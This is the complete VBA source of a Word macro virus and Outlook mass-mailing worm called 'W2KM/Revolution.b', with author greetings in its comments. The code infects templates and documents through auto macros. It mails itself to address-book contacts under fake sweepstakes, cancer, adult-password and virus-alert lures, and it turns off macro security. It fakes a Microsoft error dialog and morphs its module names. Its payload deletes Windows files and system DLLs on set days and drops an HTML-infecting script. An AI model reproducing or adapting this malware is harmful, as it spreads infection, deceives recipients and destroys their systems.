Attribute VB_Name = "gg®deD70yKTTy"

Public VrusName As String
Public Armor As Boolean
Public Bootup As Boolean
Public ByeMacro As String
Public FC_Check As Boolean
Public FO_Check As Boolean
Public FP_Check As Boolean
Public FN_Check As Boolean
Public FS_Check As Boolean
Public FSA_Check As Boolean
Public Hostinf As Boolean
Public FileInf As Boolean
Public FExport As String
Public Ex_Yes As Boolean
Public Filename As String
Public FileID As String
Public Virname As String
Public WordInit1 As String
Public WordInit2 As String
Public WordInit3 As String
Public WordInit4 As String
Public WordInit5 As String
 Function Winner()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") <> "by Error" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
x = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
Spawnme.Recipients.Add Peep
x = x + 1
If x > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "You are a winner!"
Spawnme.Body = "You have been randomly selected for entry into a sweepstakes for $500,000 cash!  To confirm that you have recieved this message, respond by opening the attached document."
Spawnme.Attachments.Add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") = "by Error"
End If
 End Function
' W2KM/Revolution .b by Error
' aka W97M/Evolution @mm series
' Brought to you by the members of TN:
' ***Greets to Decay, Hash, Nex, and Trix***
' look for W97M/Agony by Nex soon!!!
Function Word_Init()
  On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
 WordInit1 = Dir(Application.StartupPath + "\Wordinit.dot")
 WordInit2 = Dir(Application.StartupPath + "\WordTemp.dot")
 WordInit3 = Dir(Application.StartupPath + "\Add-in.dot")
 WordInit4 = Dir(Application.StartupPath + "\WordStart.dot")
 WordInit5 = Dir(Application.StartupPath + "\Default.dot")
 If WordInit1 = "Wordinit.dot" Then Bootup = True
 If WordInit2 = "WordTemp.dot" Then Bootup = True
 If WordInit3 = "Add-in.dot" Then Bootup = True
 If WordInit4 = "WordStart.dot" Then Bootup = True
 If WordInit5 = "Default.dot" Then Bootup = True
 If Bootup = True Then GoTo checkmy
If ActiveDocument.Saved = True Then
 Randomize Timer
V = Int(Rnd(1) * 5) + 1
    If V = 1 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = "C:\Windows\System"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options", "STARTUP-PATH") = "C:\Windows\System"
    End If
    If V = 2 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = "C:\Windows\Command"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options", "STARTUP-PATH") = "C:\Windows\Command"
    End If
    If V = 3 Then
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "STARTUP-PATH") = "C:\Program Files"
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Options", "STARTUP-PATH") = "C:\Program Files"
    End If
   r = Int(Rnd(1) * 3) + 1
 If r = 1 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\Wordinit.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    End If
 If r = 2 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\WordTemp.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    End If
  If r = 3 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\Add-in.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        End If
      If r = 4 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\WordStart.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
        End If
      If r = 5 Then
        ActiveDocument.SaveAs Filename:=Application.StartupPath + "\Default.dot", FileFormat:=wdFormatTemplate, AddToRecentFiles:=False, ReadOnlyRecommended:=False
    End If
    End If
checkmy:
Open "C:\windows\system\Addins.cpl" For Input As #1
Line Input #1, FileID
Close #1
Application.ScreenUpdating = False
    Call Vir_Status_ID
If Hostinf = False Then
With NormalTemplate.VBProject
            With .VBComponents.Import(FileID)
            End With
            End With
NormalTemplate.Save
End If
If FileInf = False Then
With ActiveDocument.VBProject
    With .VBComponents.Import(FileID)
    End With
End With
End If
Application.ScreenUpdating = True
End Function
 Function Outlook2K_Wyrm()
 ' For Outlook
  On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
 Dim Z
Randomize Timer
Z = Int(Rnd(1) * 5) + 1
If Z = 1 Then Call Cancer_send
If Z = 2 Then Call Adult_send
If Z = 3 Then Call Jokes_send
If Z = 4 Then Call Alert
If Z = 5 Then Call Winner
End Function
Function Cancer_send()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") <> "by Error" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
x = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
Spawnme.Recipients.Add Peep
x = x + 1
If x > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "New type of Cancer...Evolved??"
Spawnme.Body = "Info on the new type of cancer, which can infect anyone, included in the attached document :-)"
Spawnme.Attachments.Add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") = "by Error"
End If
 End Function
Function Adult_send()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") <> "by Error" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
x = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
Spawnme.Recipients.Add Peep
x = x + 1
If x > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "Free Adult Site Passwords!!"
Spawnme.Body = "Free inside attached Document are over 50 Adult Verify Passwords!!  Use for your deepest desires!! Adults Only Please..."
Spawnme.Attachments.Add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") = "by Error"
End If
End Function
Function Jokes_send()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") <> "by Error" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
x = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
Spawnme.Recipients.Add Peep
x = x + 1
If x > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "Jokes on Evolution"
Spawnme.Body = "Controverial Jokes about Evolution inside!!  They start out with...."
Spawnme.Attachments.Add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") = "by Error"
End If
End Function
Function Vir_Status_ID()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Extras.cpl" For Input As #1
Do
Line Input #1, Virname
For Z = 1 To ActiveDocument.VBProject.VBComponents.Count
               If ActiveDocument.VBProject.VBComponents(Z).Name <> "ThisDocument" Then
    If Virname = ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo lost
    If Virname <> ActiveDocument.VBProject.VBComponents(Z).Name Then GoTo newname
newname:
Close #1
Open "C:\windows\system\Extras.cpl" For Append As #1
    Print #1, ActiveDocument.VBProject.VBComponents(Z).Name
      Close #1
        End If
    If ActiveDocument.VBProject.VBComponents(Z).Name = "ThisDocument" Then GoTo lost
lost:
Next Z
Loop Until EOF(1)
Close #1
Dim Lib
Open "C:\windows\system\Extras.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To NormalTemplate.VBProject.VBComponents.Count
    If NormalTemplate.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo skip
    If NormalTemplate.VBProject.VBComponents(Lib).Name = Virname Then Hostinf = True: GoTo doccheck
skip:
Next Lib
Loop Until EOF(1)
Hostinf = False
doccheck:
Close #1
Open "C:\windows\system\Extras.cpl" For Input As #1
Do
Line Input #1, Virname
For Lib = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(Lib).Name = "ThisDocument" Then GoTo nope
    If ActiveDocument.VBProject.VBComponents(Lib).Name = Virname Then FileInf = True: GoTo leave
    If ActiveDocument.VBProject.VBComponents(Lib).Name <> Virname Then FileInf = False:
nope:
Next Lib
Loop Until EOF(1)
FileInf = False
leave:
Close #1
End Function
Function ReadOnly_Check()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
If GetAttr(NormalTemplate.FullName) = vbReadOnly Then Armor = True
Offense:
If Armor = True Then SetAttr (NormalTemplate.FullName), vbNormal
Armor = False
End Function
Function Code_transport()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
FExport = Dir("C:\windows\system\Addins.cpl")
If FExport = "Addins.cpl" Then Ex_Yes = True
If Ex_Yes = False Then GoTo Morph_ME Else GoTo Recognize
Morph_ME:
Randomize Timer
q = Int(Rnd(1) * 7) + 1
For vi = 1 To q
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
Filename = Filename + a$
Next vi
x = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & x & ".cpl"
Open "C:\windows\system\Addins.cpl" For Append As #1
Print #1, FileID
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\Extras.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
nex:
Next x
Do
On Error Resume Next
Open "C:\windows\system\Extras.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).Export FileID
ActiveDocument.VBProject.VBComponents(Virname).Export FileID
Loop Until EOF(1)
nextt:
Exit Function
Recognize:
Open "C:\windows\system\Addins.cpl" For Input As #1
Line Input #1, FileID
Close #1
Do
On Error Resume Next
Open "C:\windows\system\Extras.cpl" For Input As #1
Line Input #1, Virname
NormalTemplate.VBProject.VBComponents(Virname).Export FileID
ActiveDocument.VBProject.VBComponents(Virname).Export FileID
Loop Until EOF(1)
tryharder:
End Function
Function Polymorphic_Check()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open FileID For Input As #1
Dim FC_Check
Do
    Line Input #1, FC_Check
    If FC_Check = "Sub FileClose()" Then FC_Check = True: GoTo FO_Look
Loop Until EOF(1)
FO_Look:
Dim FO_Check
Do
    Line Input #1, FO_Check
    If FO_Check = "Sub FileOpen()" Then FO_Check = True: GoTo FP_Look
Loop Until EOF(1)
FP_Look:
Dim FP_Check
Do
    Line Input #1, FP_Check
    If FP_Check = "Sub FilePrint()" Then FP_Check = True: GoTo FN_Look
Loop Until EOF(1)
FN_Look:
Dim FN_Check
Do
    Line Input #1, FN_Check
    If FN_Check = "Sub FileNew()" Then FN_Check = True: GoTo FS_Look
Loop Until EOF(1)
FS_Look:
Dim FS_Check
Do
    Line Input #1, FS_Check
    If FS_Check = "Sub FileSave()" Then FS_Check = True: GoTo FSA_Look
Loop Until EOF(1)
FSA_Look:
Dim FSA_Check
Do
    Line Input #1, FSA_Check
    If FSA_Check = "Sub FileSaveAs()" Then FSA_Check = True: Exit Function
Loop Until EOF(1)
End Function
Function The_Uprising()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Addins.cpl" For Input As #1
Line Input #1, FileID
Close #1
Randomize Timer
PM = Int(Rnd(1) * 75) + 1
If PM = 22 Then
If FC_Check = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileClose()"
Print #1, "On error resume next"
Print #1, "Call The_New_Revolution"
Print #1, "Wordbasic.FileSave"
Print #1, "End Sub"
Close #1
End If
If PM = 73 Then
If FO_Check = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileOpen()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileOpen)"
Print #1, "Call The_New_Revolution"
Print #1, "end sub"
Close #1
End If
If PM = 69 Then
If FP_Check = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FilePrint()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFilePrint)"
Print #1, "Call The_New_Revolution"
Print #1, "End sub"
Close #1
End If
If PM = 22 Then
If FN_Check = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileNew()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileNew)"
Print #1, "Call The_New_Revolution"
Print #1, "End Sub"
Close #1
End If
If PM = 9 Then
If FS_Check = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileSave()"
Print #1, "on error resume next"
Print #1, "call The_New_Revolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
If PM = 18 Then
If FSA_Check = True Then Exit Function
Open FileID For Append As #1
Print #1, "Sub FileSaveAs()"
Print #1, "on error resume next"
Print #1, "Dialogs(wdDialogFileSaveAs)"
Print #1, "Call The_New_Revolution"
Print #1, "wordbasic.filesave"
Print #1, "end sub"
Close #1
End If
End Function
Function Host_Inf()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Open "C:\windows\system\Addins.cpl" For Input As #1
Line Input #1, FileID
Close #1
For l = 1 To ActiveDocument.VBProject.VBComponents.Count
            If ActiveDocument.VBProject.VBComponents(l).Name = "ThisDocument" Then GoTo nexus
    If ActiveDocument.VBProject.VBComponents(l).Name <> "ThisDocument" Then
        Open "C:\windows\system\Extras.cpl" For Append As #1
        Print #1, ActiveDocument.VBProject.VBComponents(l).Name
        Close #1
        End If
nexus:
    Next l
With NormalTemplate.VBProject.VBComponents.Import(FileID)
End With
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\RevolutionB", "Error") = "1" Then Exit Function
Assistant.Visible = True
    With Assistant.NewBalloon
            .Icon = msoIconAlert
            .Text = "An error has occurred, please save all Documents and restart Microsoft Word.  If the problem persists please contact Microsoft Technical Support."
            .Heading = "Microsoft Word"
            .Animation = msoAnimationGetTechy
            .Show
        End With
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\RevolutionB", "Error") = "1"
End Function
Function Doc_Inf()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
VrusName = ""
Open "C:\windows\system\Addins.cpl" For Input As #1
Line Input #1, FileID
Close #1
With ActiveDocument.VBProject.VBComponents.Import(FileID)
End With
Randomize Timer
q = Int(Rnd(1) * 15) + 2
For vi = 1 To q
RedoRN:
x = Int(Rnd(1) * 55) + 1
If vi = 1 And x > 26 Then GoTo RedoRN
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
If x = 27 Then a$ = "1"
If x = 28 Then a$ = "2"
If x = 29 Then a$ = "3"
If x = 30 Then a$ = "4"
If x = 31 Then a$ = "5"
If x = 32 Then a$ = "6"
If x = 37 Then a$ = "7"
If x = 38 Then a$ = "8"
If x = 39 Then a$ = "9"
If x = 40 Then a$ = "0"
If x = 41 Then a$ = "Þ"
If x = 42 Then a$ = "§"
If x = 43 Then a$ = "Å"
If x = 44 Then a$ = "Ø"
If x = 45 Then a$ = "Æ"
If x = 46 Then a$ = "Ð"
If x = 50 Then a$ = "ß"
If x = 51 Then a$ = "¥"
If x = 52 Then a$ = "®"
If x = 53 Then a$ = "£"
If x = 54 Then a$ = "Ñ"
If x = 55 Then a$ = "×"
    CC = Int(Rnd(1) * 6) + 1
     If CC < 4 Then
        If x <= 26 Then a$ = LCase$(a$)
     End If
If vi = 1 And x > 26 Then GoTo RedoRN
VrusName = VrusName + a$
Next vi
Open "C:\windows\system\Extras.cpl" For Input As #1
Do
Line Input #1, Virname
Application.OrganizerRename Source:=ActiveDocument.FullName, Name:=Virname, newname:=VrusName, Object:=wdOrganizerObjectProjectItems
Loop Until EOF(1)
Close #1
For x = 1 To ActiveDocument.VBProject.VBComponents.Count
    If ActiveDocument.VBProject.VBComponents(x).Name = "ThisDocument" Then GoTo nex
    If ActiveDocument.VBProject.VBComponents(x).Name <> "ThisDocument" Then GoTo rite
rite:
Open "C:\windows\system\Extras.cpl" For Append As #1
Print #1, ActiveDocument.VBProject.VBComponents(x).Name
Close #1
nex:
Next x
End Function
Function The_New_Revolution()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call Code_transport
Call Vir_Status_ID
Call ReadOnly_Check
If Hostinf = False Then Call Host_Inf
If FileInf = False Then Call Doc_Inf
Call Polymorphic_Check
Call The_Uprising
Call Revolutionary_Payload
Call Stealth_Sequences
End Function
Function Stealth_Sequences()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
    CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
End If
Options.VirusProtection = False
Options.ConfirmConversions = False
Options.SaveNormalPrompt = False
If Armor = False Then CommandBars("tools").Controls("Macro").Delete
If Armor = False Then CommandBars("tools").Controls("Templates and add-ins...").Delete
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\8.0\Word\Options", "EnableMacroVirusProtection") = "0"
End Function



' ----------------------------------------------
' W2KM/Revolution .b variant by Error
' aka W97M/Revolution .b variant
' aka W97M/Evolution @mm series
' Polymorphic/Stealth/Destructive Word 97/2000/SR-1 (and beyond) Compatable Macro Virus/Wyrm
' All Things Will Change...
' Polymorphic thanx to Random Arithmetic Polymorphic Engine (RAPE v2.1) by Error
' Add a little Melissa, some Groovie, and a whole lot of Evolution And you get one hell of a Revolution
' ----------------------------------------------
' RAPE v2.1 does:
' Randomly Morphs Source Code by Adding Remarks *Modified
' Randomly Selects Source Code Export File - Then Morphs it (improvised)
' Randomly Creates Virus' Module Name ***(2 - 55 letters)***
' Randomly Adds Commands to Code
' Randomly recreates Startup Directory  *Modified
' Randomly determines Wyrm Mail Subject/Contents *Modified
' Randomly creates Word "Boot" Infector  *Modified
' -----------------------------------------------
' Love You Nex!!
' W97M/Agony coming soon!!
' -----------------------------------------------



Sub AutoClose()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call The_New_Revolution
WordBasic.filesave
Call Word_Init
Randomize Timer
End Sub
Private Sub AutoExec()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call ReadOnly_Check
Call Stealth_Sequences
Call Word_Init
End Sub
Private Sub AutoExit()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call The_New_Revolution
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\RevolutionB", "Morphed") = "1" Then Exit Sub
If System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\RevolutionB", "Morphed") <> "1" Then Call Code_Morph
End Sub
Function Code_Morph()
Open "C:\windows\system\Addins.cpl" For Input As #2
Line Input #2, FileID
Close #2
Open FileID For Append As #9
Print #9, "' EOF"
Close #9
Open FileID For Input As #3
Randomize Timer
W = Int(Rnd(1) * 5) + 1
For vir = 1 To W
x = Int(Rnd(1) * 26)
If x = 1 Then a$ = "A"
If x = 2 Then a$ = "B"
If x = 3 Then a$ = "C"
If x = 4 Then a$ = "D"
If x = 5 Then a$ = "E"
If x = 6 Then a$ = "F"
If x = 7 Then a$ = "G"
If x = 8 Then a$ = "H"
If x = 9 Then a$ = "I"
If x = 10 Then a$ = "J"
If x = 11 Then a$ = "K"
If x = 12 Then a$ = "L"
If x = 13 Then a$ = "M"
If x = 14 Then a$ = "N"
If x = 15 Then a$ = "O"
If x = 16 Then a$ = "P"
If x = 17 Then a$ = "Q"
If x = 18 Then a$ = "R"
If x = 19 Then a$ = "S"
If x = 20 Then a$ = "T"
If x = 21 Then a$ = "U"
If x = 22 Then a$ = "V"
If x = 23 Then a$ = "W"
If x = 24 Then a$ = "X"
If x = 25 Then a$ = "Y"
If x = 26 Then a$ = "Z"
Filename = Filename + a$
Next vir
F = Int(Rnd(1) * 999) + 1
FileID = "C:\windows\system\" & Filename & F & ".cpl"
Open FileID For Append As #4
Do
Line Input #3, stuff
Print #4, stuff
    Randomize Timer
    t = Int(Rnd(1) * 6) + 1
        If t = 1 Then Z$ = " '" & Application.UserAddress
        If t = 2 Then Z$ = " '" & Application.UserName
        If t = 3 Then Z$ = " '" & Time$
        If t = 4 Then Z$ = " '" & Application.UserInitials
        If t = 5 Then Z$ = " '" & Int(Rnd(1) * 9999999)
Print #4, Z$
        Loop Until stuff = "' EOF"
Close #3
Close #4
Kill "C:\windows\system\Addins.cpl"
Open "C:\windows\system\Addins.cpl" For Append As #5
Print #5, FileID
Close #5
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\.DEFAULT\Software\RevolutionB", "Morphed") = "1"
End Function
Private Sub AutoNew()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call The_New_Revolution
End Sub
Private Sub AutoOpen()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
Call The_New_Revolution
Call Outlook2K_Wyrm
Randomize Timer
y = Int(Rnd(1) * 4) + 1
If y = 3 Then
Call Direct_Action_Infection
End If
End Sub
Function Alert()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
Dim SadAgnuOutlook, Sadmapiname, Spawnme
Set SadAgnuOutlook = CreateObject("Outlook.Application")
Set Sadmapiname = SadAgnuOutlook.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") <> "by Error" Then

If SadAgnuOutlook = "Outlook" Then
Sadmapiname.Logon "Guest", "password"
For y = 1 To Sadmapiname.AddressLists.Count
Set AddyBook = Sadmapiname.AddressLists(y)
x = 1
Set Spawnme = SadAgnuOutlook.CreateItem(0)
For oo = 1 To AddyBook.AddressEntries.Count
Peep = AddyBook.AddressEntries(x)
Spawnme.Recipients.Add Peep
x = x + 1
If x > 75 Then oo = AddyBook.AddressEntries.Count
Next oo
Spawnme.Subject = "ALERT!!"
Spawnme.Body = "A NEW Word mass-mailing virus has been discovered!  The virus, W97M/Evolution .b@mm, is yet another worm/macro virus, yet the virus is much deadlier than any previous Macro Virus.  To find out more read the attched ALERT for Evolution..."
Spawnme.Attachments.Add ActiveDocument.FullName
Spawnme.Send
Peep = ""
Next y
Sadmapiname.Logoff
End If
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "W2KM/RevolutionB...W97M/RevolutionB") = "by Error"
End If
 End Function
Sub FileTemplates()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Sub ToolsCustomize()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Sub ToolsMacro()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Sub ViewVBCode()
Application.EnableCancelKey = wdCancelDisabled

End Sub
Function Revolutionary_Payload()
On Error Resume Next
Application.EnableCancelKey = wdCancelDisabled
If System.PrivateProfileString("", "HKEY_USERS\.DEFAULT\Software\Hax\RevolutionB", "HTP-Error") = "Error!!" Then Exit Function
If Day(Now) = 18 Then GoTo NukeDLL
If Day(Now) = 2 Then GoTo Format_Me
Randomize Timer
x = Int(Rnd(1) * 40) + 1
If x = 10 Then
Open "C:\windows\Control.ini" For Append As #1
Seek #1, 0
Print #1, "[Screen Saver.3DText]"
Print #1, "DemoType = 0"
Print #1, "RotStyle = 3"
Print #1, "Tesselation = 100"
Print #1, "Size = 100"
Print #1, "Speed = 75"
Print #1, "SurfStyle = 0"
Print #1, "Font = Comic Sans MS"
Print #1, "FontAttributes = 0"
Print #1, "Charset = 0"
Print #1, "Text = Revolution B"
Print #1, "Texture = None"
Print #1, "TextureFileOffset = 3"
Close #1
End If
If x = 20 Then Call HTML_Dropper
If x = 30 Then
Open "C:\autoexec.bat" For Append As #1
Print #1, "@echo All things will change..."
Close #1
End If
' All things HAVE changed...
If x = 40 Then
On Error Resume Next
Kill "C:\logo.sys"
Kill "C:\windows\logo.sys"
Kill "C:\windows\logos.sys"
Kill "C:\windows\logow.sys"
Kill "C:\io.sys"
' Takes care of those Windows logos...
End If
Exit Function
Format_Me:
Kill "C:\windows\*.*"
' Bye Windows.....Long live Linux!!
Exit Function
NukeDLL:
Kill "C:\windows\system\*.dll"
End Function
Function HTML_Dropper()
On Error Resume Next
 Application.EnableCancelKey = wdCancelDisabled
 Randomize Timer
rvg = Int(Rnd(1) * 2) + 1
If rvg = 2 Then
' -------------------------------------------------
' HTML/Devolve .c
' Drop HTML/Devolve .c strain HTML infecting virus
' Self-Replicating version with destructive payload
' -------------------------------------------------
System.PrivateProfileString("", "HKEY_LOCAL_MACHINE\Software\Microsoft\Internet Explorer\Main", "Start Page") = "C:\Windows\System\StartUp.html"
Open "C:\windows\system\StartUp.html" For Output As #1
Print #1, "<html><!--HTML/Devolve .c-->"
Print #1, "<body>"
Print #1, "<SCRIPT language=vbscript>"
Print #1, "Sub Window_OnLoad()"
Print #1, "Call Infection"
Print #1, "Call Payload"
Print #1, "End Sub"
Print #1, "Sub Infection()"
Print #1, "Set FLSysObj = CreateObject" & Chr(40) & Chr(34) & "Scripting.FileSystemObject" & Chr(34) & Chr(41)
Print #1, "Set wordobj = CreateObject" & Chr(40) & Chr(34) & "Word.application" & Chr(34) & Chr(41)
Print #1, "Set FLSrch = wordobj.Application.FileSearch"
Print #1, "FLSrch.NewSearch"
